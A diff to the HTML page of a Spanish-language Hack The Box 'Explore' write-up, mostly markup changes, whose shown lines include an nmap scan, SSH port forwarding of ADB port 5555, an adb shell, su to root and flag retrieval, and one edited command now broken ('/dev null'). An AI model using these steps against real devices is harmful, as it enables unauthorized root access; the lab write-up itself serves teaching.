@@ -27,7 +27,7 @@
             <img src="../assets/img/htb_explore/ExploreSmall.png" alt="explore">
             <h3>Escaneo de puertos</h3>
             <pre class="pre">
-<code class="language-txt">❯ nmap -p- --open -T5 -v -n 10.10.10.247
+<code class="code language-txt">❯ nmap -p- --open -T5 -v -n 10.10.10.247
 PORT      STATE SERVICE
 2222/tcp  open  EtherNetIP-1
 41127/tcp open  unknown
@@ -122,7 +122,7 @@ ftpPort : 3721</code></pre>
             <pre class="pre"><code class="language-txt">:/sdcard $ cat user.txt                                                        
 fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0</code></pre>
             <p>Lanzo un<strong> &nbsp;ss -ltun&nbsp;</strong>y veo el puerto 5555 abierto.</p>
-            <img src="/assets/img/htb_explore/ltun.png" alt="ltun">
+            <img src="../assets/img/htb_explore/ltun.png" alt="ltun">
             <p>Como veo que el puerto abierto está en local usaré un ssh port forwarding para reenviar el puerto 5555 a mi máquina.</p>
             <pre class="pre"><code class="language-txt">ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555</code></pre>
             <h3>ADB</h3>
@@ -135,22 +135,22 @@ connected to localhost:5555</code></pre>
             <p>Obtengo una shell con:</p>
             <pre class="pre"><code class="language-txt">❯ adb -s localhost:5555 shell
 x86_64:/ $</code></pre>
-            <h3>r00t</h3>
-            <p>Para conseguir la elevación de privilegios escribimos<strong>&nbsp;su.&nbsp;</strong><p>
+<h3>r00t</h3>
+            <p>Para elevar de privilegios escribimos<strong>&nbsp;su</strong>.<p>
             <pre class="pre"><code class="language-txt">x86_64:/ $ su
 :/ # </code></pre>
-            <p>Con find busco el archivo root.txt para conseguir la flag de root.</p>
-            <pre class="pre"><code class="language-txt">:/ # find / -name "root.txt" 2>/dev/null
+            <p>Con find busco el archivo root.txt para conseguir la flag de root.</p><pre class="pre"><code class="language-txt">:/ # find / -name "root.txt" 2>/dev null
 /data/root.txt
 :/ # cat /data/root.txt                                                      
 fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx5</code></pre>
             <p>Y aquí termina Explore, nos vemos ;)</p>
-            <br>
         </div>
        </main>
-    <footer class="footer">
-        <a class="a_footer" href="https://github.com">noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
-    </footer>
+    <div class="container_footer">
+        <footer class="footer">
+            <a class="a_footer" href="https://github.com">noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
+        </footer>
+    </div>
     <script src="../assets/js/prism.js"></script>
 </body>
 </html>
